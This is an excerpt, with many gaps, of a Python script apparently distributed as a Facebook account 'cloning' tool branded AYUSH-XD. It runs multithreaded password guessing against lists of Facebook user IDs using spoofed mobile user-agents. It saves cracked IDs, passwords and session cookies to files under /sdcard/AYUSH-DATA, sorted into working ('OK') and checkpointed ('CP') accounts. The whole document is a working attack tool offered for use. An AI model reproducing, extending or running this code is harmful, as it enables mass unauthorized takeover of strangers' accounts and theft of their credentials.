...
#Chnge Name 
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mMR-AYUSH-XD]')
...
def banner():
	clear()
	sol()
	ban=''' © MASTER MIND AYUSH XD
   _____  ____  ________ __
  / _ \ \/ / / / / __/ // / [•] Author Ayush Magar
 / __ |\  / /_/ /\ \/ _  /  [•] Facebook Ayush
/_/ |_|/_/\____/___/_//_/   [•] Master Mind  Ayush Magar                   
                                                                                                                               '''
...
def login_lagi334():
	try:
		...
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "user-agent: Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5(KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
...
def menu(my_name,my_id):
	...
	cetak(nel('\tWELCOME [green]%s[purple] USER'%(my_name)))
...
def result():
	...
	if kz in ['1','01']:
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print('=>You Donot Have The File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def setting():
	...
	print('') 
	cetak(nel('[bold white]1. CLONE JUST OLD IDZ \n2. CLONE JUST NEW IDZ(RECOMMEND)\n3. CLONE MIX IDZ NEW/OLD(RECOMMEND) [bold white]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ['1','01']:
...
#   elif _jembot_ in ['y','Y']:
	...
	#else:
		#taplikasi.append('no')
	pwplus=input('=>Password Menu Manual Choose Default ( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	...
	print(f'                          {m}A {k}Y {h}U {u}S {b}H {u} ★  {b}M {u}A {h}G {k}A {m}R ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[purple]   =>[green]  Cloning Vaiiyo Machiikne Khusii Ho Aaba [purple] <<[yellow] '))
	print(f'[{h}•{u}]{h} OK : {h}%s '%(ok))
	print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
	print('{k}=>Continue Crack Back ( y/n ) ? ')
	woi = input('=>Choose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}=>{k} Ayush Name Yaad Rakhna {u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}AYUSH-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]       AYUSH-OK [green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      HELLO THIS AYUSH-XD  [purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/AYUSH-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/AYUSH-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='AYUSH - OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]AYUSH - OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}' 
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AYUSH - CP'))
					open('/sdcard/AYUSH-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
